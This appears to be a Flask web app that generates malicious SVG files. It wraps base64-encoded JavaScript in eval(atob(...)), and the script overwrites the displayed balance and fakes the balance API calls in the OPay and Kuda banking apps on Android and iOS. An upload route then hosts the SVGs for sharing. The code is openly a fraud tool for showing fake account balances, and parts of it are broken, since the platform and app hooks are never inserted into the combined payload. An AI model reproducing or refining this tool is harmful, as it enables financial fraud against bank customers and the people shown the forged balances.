from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import uuid
import os
import random
import base64

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

def generate_demonic_payload(device_id, target_app, target_amount):
    # Validate inputs
    if not device_id or not target_app or not target_amount:
        raise ValueError("Missing required parameters")
    
    # App-specific hooks for OPay and Kuda
    opay_hooks = """
    // OPay-specific hooks
    try {
        // Override OPay's balance element
        const opayElements = document.querySelectorAll('[data-testid="opay-balance"]');
        if (opayElements.length > 0) {
            opayElements[0].textContent = 'TARGET_AMOUNT';
        }
        
        // Hook into OPay's native methods
        if (window.OPayAPI) {
            window.OPayAPI.getAccountBalance = function() {
                return Promise.resolve({balance: 'TARGET_AMOUNT'});
            };
        }
    } catch (e) {}
    """
    
    kuda_hooks = """
    // Kuda-specific hooks
    try {
        // Override Kuda's balance element
        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
        if (kudaElements.length > 0) {
            kudaElements[0].textContent = 'TARGET_AMOUNT';
        }
        
        // Hook into Kuda's native methods
        if (window.KudaAPI) {
            window.KudaAPI.getAccountBalance = function() {
                return Promise.resolve({balance: 'TARGET_AMOUNT'});
            };
        }
    } catch (e) {}
    """
    
    # Platform-specific hooks for Android and iOS
    android_hooks = """
    // Android-specific hooks
    try {
        // WebView detection
        if (navigator.userAgent.includes('Android')) {
            // Native bridge hooks
            window.NativeBridge = window.NativeBridge || {};
            window.NativeBridge.getAccountBalance = function() {
                return Promise.resolve({balance: 'TARGET_AMOUNT'});
            };
            
            // Override native methods
            const originalPushState = history.pushState;
            history.pushState = function() {
                originalPushState.apply(this, arguments);
                setTimeout(() => {
                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                        el.textContent = 'TARGET_AMOUNT'
                    );
                }, 100);
            };
        }
    } catch (e) {}
    """
    
    ios_hooks = """
    // iOS-specific hooks
    try {
        // WKWebView detection
        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {
            // Safari bridge hooks
            if (window.webkit && window.webkit.messageHandlers) {
                window.webkit.messageHandlers.getAccountBalance = {
                    postMessage: function() {
                        return Promise.resolve({balance: 'TARGET_AMOUNT'});
                    }
                };
            }
            
            // Override native methods
            const originalPushState = history.pushState;
            history.pushState = function() {
                originalPushState.apply(this, arguments);
                setTimeout(() => {
                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                        el.textContent = 'TARGET_AMOUNT'
                    );
                }, 100);
            };
        }
    } catch (e) {}
    """
    
    # Replace placeholders with actual values
    opay_hooks = opay_hooks.replace('TARGET_AMOUNT', target_amount)
    kuda_hooks = kuda_hooks.replace('TARGET_AMOUNT', target_amount)
    android_hooks = android_hooks.replace('TARGET_AMOUNT', target_amount)
    ios_hooks = ios_hooks.replace('TARGET_AMOUNT', target_amount)
    
    # Combined payload with all hooks
    js_payload = """
    // Platform detection
    const isAndroid = navigator.userAgent.includes('Android');
    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
    
    // Store target app and amount
    const targetApp = 'TARGET_APP';
    const targetAmount = 'TARGET_AMOUNT';
    
    // Hook into storage events
    window.addEventListener('storage', function(e) {
        if (e.key === 'targetBalance') {
            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                el.textContent = e.newValue
            );
        }
    });
    
    // Execute platform-specific hooks
    if (isAndroid) {
        // Android-specific hooks
    } else if (isIOS) {
        // iOS-specific hooks
    }
    
    // Execute app-specific hooks
    if (targetApp === 'OPay') {
        // OPay-specific hooks
    } else if (targetApp === 'Kuda') {
        // Kuda-specific hooks
    }
    
    // Try deep links first
    try {
        window.location = 'kuda://balance';
        window.location = 'opay://dashboard?section=balance';
    } catch (e) {
        // Fallback to direct DOM manipulation
        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
            el.textContent = 'TARGET_AMOUNT'
        );
    }
    """
    
    # Replace placeholders with actual values
    js_payload = js_payload.replace('TARGET_APP', target_app).replace('TARGET_AMOUNT', target_amount)
    
    # Encode payload to avoid syntax errors
    encoded_payload = base64.b64encode(js_payload.encode()).decode()
    svg_payload = """
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            // Execute payload using eval
            (function() {
                try {
                    eval(atob('BASE64_PAYLOAD'));
                } catch (e) {
                    console.log("Eval error:", e);
                }
            })();
        </script>
    </svg>
    """
    
    # Replace placeholder with actual payload
    svg_payload = svg_payload.replace('BASE64_PAYLOAD', encoded_payload)
    
    return svg_payload

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    try:
        # Handle both JSON and form data
        if request.is_json:
            data = request.get_json()
            device_id = data.get('device_id')
            target_app = data.get('target_app')
            target_amount = data.get('target_amount')
        else:
            device_id = request.form.get('deviceId')
            target_app = request.form.get('targetApp')
            target_amount = request.form.get('targetAmount')
        
        # Validate inputs
        if not device_id or not target_app or not target_amount:
            return jsonify({'error': 'Missing required parameters'}), 400
        
        payload = generate_demonic_payload(device_id, target_app, target_amount)
        delay = random.randint(1000, 5000)
        payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
        payload = payload.replace('), 1000)', f'), {delay})')
        
        return jsonify({'payload': payload})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        filename = f"{uuid.uuid4()}.svg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        return jsonify({'url': f"{request.url_root}uploads/{filename}"})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
